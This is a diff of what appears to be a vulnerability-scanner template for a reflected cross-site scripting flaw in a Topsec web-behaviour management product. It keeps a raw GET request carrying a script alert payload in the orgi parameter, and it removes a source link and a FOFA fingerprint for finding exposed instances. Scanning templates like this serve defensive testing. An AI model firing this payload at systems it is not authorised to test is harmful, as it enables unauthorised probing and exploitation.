@@ -3,12 +3,8 @@ info:
   name: 天融信上网行为管理 PC 存在跨站脚本漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fp8bh2pqqvgvl2m3'
+  description: ''
   tags: other,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: fp8bh2pqqvgvl2m3
-    fofa: body="ActiveXObject" && body="dkey_login" && body="repeat-x"
 http:
 - raw:
   - 'GET /smsauth/adverdeclare/pc.php?orgi=%22%3E%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1
